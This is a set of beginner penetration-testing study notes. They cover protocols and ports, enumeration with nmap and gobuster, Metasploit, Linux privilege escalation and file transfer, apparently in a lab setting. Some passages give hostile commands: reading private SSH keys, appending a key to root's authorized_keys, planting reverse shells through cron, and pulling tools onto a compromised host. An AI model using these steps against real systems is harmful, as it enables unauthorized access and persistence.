# Basics - Cybersecurity | Ethical Hacking

## These are the ***<u>Common Terms</u>*** we will come accross in learning

<br/>

1. **Shell**
2. **Port**
3. **Web Server**
<br/><br/>

### **What is a Shell?**

 On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function. In the early days of computing, the shell was the only interface available for interacting with systems. Since then, many more operating system types and versions have emerged along with the graphic user interface (GUI) to complement command-line interfaces (shell), such as the Linux terminal, Windows command-line (cmd.exe), and Windows PowerShell.

 Most Linux systems use a program called Bash (Bourne Again Shell) as a shell program to interact with the operating system. Bash is an enhanced version of sh, the Unix systems' original shell program. Aside from bash there are also other shells, including but not limited to Zsh, Tcsh, Ksh, Fish shell, etc.

 We will often read about or hear others talking about "getting a shell" on a box (system). This means that the target host has been exploited, and we have obtained shell-level access (typically bash or sh) and can run commands interactively as if we are sitting logged in to the host. A shell may be obtained by exploiting a web application or network/service vulnerability or obtaining credentials and logging into the target host remotely. There are three main types of shell connections:

Shell Type        | Description
------------------|----------
 Reverse shell    | Initiates a connection back to a "listener" on our attack box.
 Bind shell       | "Binds" to a specific port on the target host and waits for a connection from our attack box.
 Web shell        | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.

### **What is a Port?**

A port can be thought of as a window or door on a house (the house being a remote system), if a window or door is left open or not locked correctly, we can often gain unauthorized access to a home. This is similar in computing. Ports are virtual points where network connections begin and end. They are software-based and managed by the host operating system. Ports are associated with a specific process or service and allow computers to differentiate between different traffic types (SSH traffic flows to a different port than web requests to access a website even though the access requests are sent over the same network connection).

Each port is assigned a number, and many are standardized across all network-connected devices (though a service can be configured to run on a non-standard port). For example, HTTP messages (website traffic) typically go to port 80, while HTTPS messages go to port 443 unless configured otherwise. We will encounter web applications running on non-standard ports but typically find them on ports 80 and 443. Port numbers allow us to access specific services or applications running on target devices. At a very high level, ports help computers understand how to handle the various types of data they receive.

There are two categories of ports, Transmission Control Protocol (TCP), and User Datagram Protocol (UDP).
TCP is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.
UDP utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. UDP is useful when error correction/checking is either not needed or is handled by the application itself. UDP is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with TCP and can significantly affect a real-time system. There are 65,535 TCP ports and 65,535 different UDP ports, each denoted by a number. Some of the most well-known TCP and UDP ports are listed below:

Port(s)     |    Protocol
------------------|----------
20/21 (TCP) |    FTP
22 (TCP) |    SSH
23 (TCP) |    Telnet
25 (TCP) |    SMTP
80 (TCP) |    HTTP
161 (TCP/UDP) | SNMP
389 (TCP/UDP) | LDAP
443 (TCP) |    SSL/TLS (HTTPS)
445 (TCP) |    SMB
3389 (TCP) |    RDP

Guides such as [this](https://www.stationx.net/common-ports-cheat-sheet/) and [this](https://packetlife.net/media/library/23/common-ports.pdf) are great resources for learning standard and less common TCP and UDP ports. Challenge yourself to memorize as many of these as possible and do some research about each of the protocols listed in the table above. This is a great reference on the top 1,000 TCP and UDP ports from nmap along with the top 100 services scanned by nmap.

### **What is a Web Server?**

A web server is an application that runs on the back-end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser. Web servers usually run on TCP ports 80 or 443, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses:

As web applications tend to be open for public interaction and facing the internet, they may lead to the back-end server being compromised if they suffer from any vulnerabilities. Web applications can provide a vast attack surface, making them a high-value target for attackers and pentesters.

Many types of vulnerabilities can affect web applications. We will often hear about/see references to the [OWASP Top 10](https://owasp.org/www-project-top-ten/). This is a standardized list of the top 10 web application vulnerabilities maintained by the Open Web Application Security Project (OWASP). This list is considered the top 10 most dangerous vulnerabilities and is not an exhaustive list of all possible web application vulnerabilities. Web application security assessment methodologies are often based around the OWASP top 10 as a starting point for the top categories of flaws that an assessor should be checking for. [The current OWASP Top 10 list is:](https://owasp.org/www-project-top-ten/)

Number | Category  | Description
------------------|---------- | ---
1 |    Broken Access Control   |   Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.
2   |   ryptographic Failures   |   Failures related to cryptography which often leads to sensitive data exposure or system compromise.
3   |    Injection   |   User-supplied data is not validated, filtered, or sanitized by the application. Some examples of injections are SQL injection, command injection, LDAP injection, etc.
4   |    Insecure Design   |   These issues happen when the application is not designed with security in mind.
5   |    Security Misconfiguration   |   Missing appropriate security hardening across any part of the application stack, insecure default configurations, open cloud storage, verbose error messages which disclose too much information.
6   |    Vulnerable and Outdated Components   |   Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date.
7   |    Identification and Authentication Failures   |    Authentication-related attacks that target user's identity, authentication, and session management.
8   |    Software and Data Integrity Failures   |   Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs).
9   |    Security Logging and Monitoring Failures   |   This category is to help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected..
10   |    Server-Side Request Forgery   |   SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

<br/>

<hr style="height:3px;background:gray">
<br/>

## <u>Basic Tools</u>

Tools such as SSH, Netcat, Tmux, and Vim are essential and are used daily by most information security professionals. Although these tools are not intended to be penetration testing tools, they are critical to the penetration testing process, so we must master them.

### **Difference between SSH, SFTP, SMB**

SSH, SFTP, SMB are different protocols and they are having respective works to do

**SSH - Secure Shell**:<br/>
It is mainly used to connect with remote server, and can run commands like installation, etc...

SSH is primarily a character oriented protocol, for a human with a keyboard to send commands to a remote Command Line Interface for execution.

<a id="ftp_section"></a>
**SFTP - Secure File Transfer Protocol:**<br/>
SFTP uses ssh protocol internelly , but this is used to upload / download large files

-the FTP client must have enough local storage space to store a copy of the entire file

- there are two separate copies of the file: the original file on the FTP server and the copy of the file on the FTP client. The two files are then independent: any changes in one copy of the file are not reflected in the other copy.

**SMB - Server Message Block:**<br/>
SMB is primarily a file sharing (and printer sharing) protocol; no access to the command line.

SMB is a File Server protocol. Its primary purpose is to allow multiple users to read and write from the same file that is stored only on the File Server.

-the SMB client does not have to use any local storage to store a copy of the file. It can read and write data directly on the File Server.

-any changes that one user makes to the file are immediately visible to the other users of the same file. There is only a single file that is shared by multiple users.

SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as EternalBlue. It is crucial to enumerate this sizeable potential attack surface carefully. Nmap has many scripts for enumerating SMB, such as smb-os-discovery.nse, which will interact with the SMB service to extract the reported operating system version.

---

**Let me tell you 18 Important protocols that a network engineer must know.
Before we jump in let us divide these 18 Important protocols into :-**

TCP (Transmission control protocol)
aka connection oriented protocol - Port No : 06
It works on transport layer of OSI (Open System Interaction) Model.
It is three way handshake.

List of TCP Protocols:-

FTP (File Transfer Protocol) : It transfers file/folders/document/data between two devices. It does not matter that file transfer is happening in same network or completely different network.
Port No : 20
Port No : 21 (for establishing and maintaining connection)
TFTP (Trivial File Transfer Protocol) : FTP asks for username and password. whereas TFTP doesn’t.
Port No : 69
SFTP (Secure File Transfer Protocol) : It encrypts the data. It is more secure than FTP & TFTP.
Port No : 22 (Secure shell)
TELNET : It is used for accessing the device/ system remotely & not secure at all. No GUI, configured using CMD.
Port No : 23
e-Mailing services also use TCP:-
SMTP(Simple Mail Transfer Protocol) : It is used by mail server to communicate with another mail server.
Port No : 25
Port No : 465 ( Port is secured using TLS & SSL)
IMAP4 (Internet Mail Access Protocol) : It downloads a copy of mail from the mail server whereas original mail is still on the server.
Port No : 143
Port No : 993 ( Port is secured using TLS & SSL)
POP3 (Post Office Protocol 3) : It downloads the original mail from the mail server,sSaves it physically in your computer and if you delete that mail it will be completely vanished from server too. you can’t get it back.
Port No : 110
Port No : 995 (Port is secured using TLS & SSL)
HTTP (Hyper Text Transfer Protocol): It is makes you to see a web page.
Port No : 80
HTTPS (Hyper Text Transfer Protocol Secure): Http turns into https for making itself more secure.
Port No : 443 (Port is secured using TLS & SSL)
UDP (User Datagram Protocol)
aka connection less protocol - Port No : 17

List of UDP Protocols:-

SNMP (Simple Network Management Protocol) : It gathers information of the network infrastructure like active routers, switches, firewalls, servers, etc and sends this information to admin.
Port No : 161
Port No : 162 (secure Port using Transport layer security)
NTP (Network Time Protocol) : It synchronizes servers on time for providing applications and other services to clients.
Port No : 123
SIP ( Session Initiation Protocol) : It works with Video and voice.
Port No : 5060
Port No : 5061 (secure Port using Transport layer security)
RTSP ( Real Time Streaming Protocol) : it is used by servers for streaming media like youtube.
Port No : 554
DHCP ( Dynamic Host Configuration Protocol) : It dynamically provides ip address, subnet mask, default gateway, dns a complete tcp/ip setting to a device actively connected to network. Small companies uses DHCP in router while big companies uses it in servers.
Port No : 67
Port No : 68
TCP & UDP Both

LDAP (Lightweight Directory Access Protocol) : It has a directory(active directory) of all the data related to Network System like username of person using device (first name, last name etc), password & other details of user, name of devices( printers/switches/routers/servers etc).
Port No : 389
RDP (Remote Desktop Protocol): It uses windows. it connects & manages the computer remotely(probably miles away.
Port No : 3389
DNS (Domain Name System) : Huge Protocol. It is used for remembering domain names like facebook.com, youtube.com. As we know that system works in binary but we humans are more comfortable with names and decimal numbers. Humans write names of websites and DNS converts that name into numbers (ip address) so that system can understand the request and user can get the desired result.
Port No : 53
TCP & UDP are the huge protocols out there and all others protocols basically rely on either TCP or UDP or Both, which works on the transport layer of OSI (Open System Interaction) Model.

### **Using Netcat:**

Netcat functions as a back-end tool that allows for port scanning and port listening. In addition, you can actually transfer files directly through Netcat or use it as a backdoor into other networked systems

Netcat, ncat, or nc, is an excellent network utility for interacting with TCP/UDP ports. It can be used for many things during a pentest. Its primary usage is for connecting to shells, which we'll discuss later in this module. In addition to that, netcat can be used to connect to any listening port and interact with the service running on that port. For example, SSH is programmed to handle connections over port 22 to send all data and keys. We can connect to TCP port 22 with netcat:

Netcat is a simple program that reads and writes data across networks, much the same way that cat reads and writes data to files. Netcat's functionality is helpful as both a standalone program and a back-end tool in a wide range of applications. Some of the many uses of Netcat include port scanning, transferring files, grabbing banners, port listening and redirection, and more nefariously, a backdoor.

### **Using Tmux**

Terminal multiplexers, like tmux or Screen, are great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them. Let's see some examples of using tmux, which is the more common of the two. If tmux is not present on our Linux system, we can install it with the following command:

### **Using Vim**

Vim is a great text editor that can be used for writing code or editing text files on Linux systems. One of the great benefits of using Vim is that it relies entirely on the keyboard, so you do not have to use the mouse, which (once we get the hold of it) will significantly increase your productivity and efficiency in writing/editing code. We usually find Vim or Vi installed on compromised Linux systems, so learning how to use it allows us to edit files even on remote systems. Vim also has many other features, like extensions and plugins, which can significantly extend its usage and make for a great code editor. Let's see some of the basics of Vim. To open a file with Vim, we can add the file name after it:

## **<u>Service Scanning</u>**

### Nmap

Let us start with the most basic scan. Suppose that we want to perform a basic scan against a target residing at 10.129.42.253. To do this we should type nmap 10.129.42.253 and hit return. We see that the Nmap scan was completed very quickly. This is because if we don't specify any additional options, Nmap will only scan the 1,000 most common ports by default. The scan output reveals that ports 21, 22, 80, 139, and 445 are available.

## **<u>Attacking Network Services</u>**
[//]: <> (https://academy.hackthebox.com/module/77/section/726)

## FTP

FTP will also comes under this, detailed explaniation given [here](#ftp_section)

## Banner Grabbing

As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated. Nmap will attempt to grab the banners if the syntax nmap -sV --script=banner <target> is specified. We can also attempt this manually using Netcat. Let us take another example, using the nc version of Netcat:

It is a method used by security teams and hackers to gain information about network computer systems and services by running on open ports. A banner is a piece of information displayed by a host that provides details about the service or system, such as its software version, operating system, and other facts. This text contained in a banner can help identify the software name, software version numbers, and operating systems running on network hosts, which can then be used to find out the vulnerabilities in the network. 

This technique can be practiced manually or automatically using tools such as Nmap, Netcat, Nikro, cURL, and Wget. Running a banner-grabbing attack can be useful for security testing and vulnerability assessment. This is because it helps identify vulnerable and insecure applications that can compromise and exploit the target system. 

#### Types of Banner Grabbing

**Active Banner Grabbing**

Here, attackers send packets to a remote host and analyze the response data. This attack involves establishing a Transmission Control Protocol (TCP)  or similar connection between an origin and remote host. It is one of the most widely-used techniques. However, it is also a risky approach as such attempts can be easily detected by Intrusion Detection Systems (IDS).

**Passive Banner Grabbing**

This method allows attackers to capture information without sending any requests or traffic to the system. Hence, there is no risk detection. It involves deploying malware and software as a gateway to prevent a direct connection.  Also, it entails using third-party network tools and services, such as Shodan, search engines, or traffic sniffing, to gather and analyze packets to determine the software and versions running on the target server. 

**Banner Grabbing Tools**

 - **Telnet:** A widely-used cross-platform client which provides a
   command-line interface that allows users to interact with remote
   services and systems
   
 - **Netcat:** One of the most popular and oldest tools for network   
   exploration, administration, and security testing on Unix and Linux  
   systems

 - **Wget:** A great tool that leads users to remote banners or local   
   servers and utilizes a simple script to eliminate expected output and
   display HTTP server headers

 - **Nmap:** A simple and effective tool designed to establish a connection 
   to an open TCP port on a target system and quickly retrieve details  
   provided by the listening service
   
 - **Whatweb:** A tool that identifies websites and allows hackers and   
   security analysts to capture the banner of web applications by   
   revealing server information such as IP, operating system, and   
   version



### Shares

SMB allows users and administrators to share folders and make them accessible remotely by other users. Often these shares have files in them that contain sensitive information such as passwords. A tool that can enumerate and interact with SMB shares is smbclient. The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.

### SNMP

SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

---

## Web Enumeration

When performing service scanning, we will often run into web servers running on ports 80 and 443. Webservers host web applications (sometimes more than 1) which often provide a considerable attack surface and a very high-value target during a penetration test. Proper web enumeration is critical, especially when an organization is not exposing many services or those services are appropriately patched.

#### Gobuster

After discovering a web application, it is always worth checking to see if we can uncover any hidden files or directories on the webserver that are not intended for public access. We can use a tool such as ffuf or GoBuster to perform this directory enumeration. Sometimes we will find hidden functionality or pages/directories exposing sensitive data that can be leveraged to access the web application or even remote code execution on the web server itself.

**Directory/File Enumeration**

GoBuster is a versatile tool that allows for performing DNS, vhost, and directory brute-forcing. The tool has additional functionality, such as enumeration of public AWS S3 buckets. For this module's purposes, we are interested in the directory (and file) brute-forcing modes specified with the switch dir. Let us run a simple scan using the dirb common.txt wordlist.

jayasooryamr@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt

**DNS Subdomain Enumeration**

There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited. We can use GoBuster to enumerate available subdomains of a given domain using the dns flag to specify DNS mode. First, let us clone the SecLists GitHub repo, which contains many useful lists for fuzzing and exploitation:

**Install SecLists**


## Web Enumeration Tips

**Banner Grabbing / Web Server Headers**

In the last section, we discussed banner grabbing for general purposes. Web server headers provide a good picture of what is hosted on a web server. They can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured. We can use cURL to retrieve server header information from the command line. cURL is another essential addition to our penetration testing toolkit, and familiarity with its many options is encouraged.

**Whatweb**

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. This information can help us pinpoint the technologies in use and begin to search for potential vulnerabilities.

Whatweb is a handy tool and contains much functionality to automate web application enumeration across a network.


**Certificates:**

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to https://10.10.10.121/ and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

**Robots.txt**

It is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The robots.txt file can provide valuable information such as the location of private files and admin pages. In this case, we see that the robots.txt file contains two disallowed entries.

**Source Code**

It is also worth checking the source code for any web pages we come across. We can hit [CTRL + U] to bring up the source code window in a browser. This example reveals a developer comment containing credentials for a test account, which could be used to log in to the website.


## Public Exploits

Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.

**Finding Public Exploits**

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with exploit to see if we get any results:

A well-known tool for this purpose is searchsploit, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

`jayasooryamr@htb[/htb]$ sudo apt install exploitdb -y`

Then, we can use searchsploit to search for a specific application by its name, as follows:

`jayasooryamr@htb[/htb]$ searchsploit openssh 7.2`

We can also utilize online exploit databases to search for vulnerabilities, like Exploit DB, Rapid7 DB, or Vulnerability Lab. The Intro to Web Applications module discusses public vulnerabilities for web applications.


## Metasploit Primer

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

- Running reconnaissance scripts to enumerate remote hosts and compromised targets

- Verification scripts to test the existence of a vulnerability without actually compromising the target

- Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets

- Many post-exploitation and pivoting tools

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run Metasploit, we can use the msfconsole command:

`jayasooryamr@htb[/htb]$ msfconsole`

Once we have Metasploit running, we can search for our target application with the search exploit command. For example, we can search for the SMB vulnerability we identified previously:

`msf6 > search exploit eternalblue`
d
> Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search

[//]: <> (need to learn this metasploit primer more in detail)
[//]: <> (https://academy.hackthebox.com/module/77/section/843)



## **Privilege Escalation**

Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows. Let us walk through some common methods of escalating our privileges.


### **PrivEsc Checklists**

Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings, which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.

### **Enumeration Scripts**

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.

Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

Let us take an example of running the Linux script from PEASS called LinPEAS:

```
jayasooryamr@htb[/htb]$ ./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```


### **Kernel Exploits**

Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.

For example, the above script showed us the Linux version to be 3.9.0-73-generic. If we Google exploits for this version or use searchsploit, we would find a CVE-2016-5195, otherwise known as DirtyCow. We can search for and download the DirtyCow exploit and run it on the server to gain root access.

### **Vulnerable Software**

Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.

### **User Privileges**

Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.

**User Privileges**
Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:

```
Sudo
SUID
Windows Token Privileges
```
The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like tcpdump' or allow the user to access certain root-only directories. We can check what sudo privileges we have with the sudo -l command:

```  
jayasooryamr@htb[/htb]$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```
The above output says that we can run all commands with sudo, which gives us complete access, and we can use the su command with sudo to switch to the root user:

```  
jayasooryamr@htb[/htb]$ sudo su -

[sudo] password for user1:
whoami
root
```
The above command requires a password to run any commands with sudo. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:

  
`jayasooryamr@htb[/htb]$ sudo -l`

    (user : user) NOPASSWD: /bin/echo
The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with -u user:

  
`jayasooryamr@htb[/htb]$ sudo -u user /bin/echo Hello World!`

    Hello World!
Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user. GTFOBins contains a list of commands and how they can be exploited through sudo. We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have.

LOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

### **Scheduled Tasks**

In both Linux and Windows, there are methods to have scripts run at specific intervals to carry out a task. Some examples are having an anti-virus scan running every hour or a backup script that runs every 30 minutes. There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

Add new scheduled tasks/cron jobs
Trick them to execute a malicious software
The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:

```
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```
If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

### **Exposed Credentials**

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:

```  
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```
As we can see, the database password 'password123' is exposed, which would allow us to log in to the local mysql databases and look for interesting information. We may also check for Password Reuse, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:

```  
jayasooryamr@htb[/htb]$ su -

Password: password123
whoami

root
```
We may also use the user credentials to ssh into the server as that user.

### **SSH Keys**

Finally, let us discuss SSH keys. If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:

```  
jayasooryamr@htb[/htb]$ vim id_rsa
jayasooryamr@htb[/htb]$ chmod 600 id_rsa
jayasooryamr@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
root@remotehost#
```
Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.

If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file:

```  
jayasooryamr@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```
This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:

  
`user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`
Now, the remote server should allow us to log in as that user by using our private key:

  
`jayasooryamr@htb[/htb]$ ssh root@10.10.10.10 -i key`

`root@remotehost#` 
As we can see, we can now ssh in as the user root. The Linux Privilege Escalation and the Windows Privilege Escalation modules go into more details on how to use each of these methods for Privilege Escalation, and many others as well.


## **Transferring Files**

During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

### **Using wget**

There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

```
jayasooryamr@htb[/htb]$ cd /tmp
jayasooryamr@htb[/htb]$ python3 -m http.server 8000
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```  
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```
Note that we used our IP 10.10.14.1 and the port our Python server runs on 8000. If the remote server does not have wget, we can use cURL to download the file:

```
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```
Note that we used the -o flag to specify the output file name.


### **Using SCP**

Another method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. We can do so as follows:

  
`jayasooryamr@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh`

```
user@remotehost's password: *********
linenum.sh
```

Note that we specified the local file name after scp, and the remote directory will be saved to after the :.


### **Using Base64**

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:

 ``` 
jayasooryamr@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```
Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:

  
`user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

### **Validating File Transfers**

To validate the format of a file, we can run the file command on it:

```  
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```
As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:

```  
jayasooryamr@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
Now, we can go to the remote server and run the same command on the file we transferred:

```  
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
As we can see, both files have the same md5 hash, meaning the file was transferred correctly. There are various other methods for transferring files. You can check out the File Transfers module for a more detailed study on transferring files.